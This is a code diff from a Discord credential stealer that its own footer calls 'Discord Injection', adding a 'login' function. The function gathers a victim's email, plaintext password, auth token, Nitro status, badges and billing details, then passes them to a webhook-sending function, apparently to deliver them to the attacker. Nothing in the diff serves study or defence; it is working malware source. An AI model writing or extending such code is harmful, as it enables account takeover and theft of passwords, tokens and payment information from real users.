@@ -323,6 +323,48 @@ const hooker = (content) => {
 `);
 };
 
+const login = async (email, password, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: "**Account Info**",
+            value: `Email: **${email}** - Password: **${password}**`,
+            inline: false,
+          },
+          {
+            name: "**Discord Info**",
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: false,
+          },
+          {
+            name: "**Token**",
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + "#" + json.discriminator + " | " + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content["content"] = config.ping_val;
+  hooker(content);
+};
+
 const passwordChanged = async (oldpassword, newpassword, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
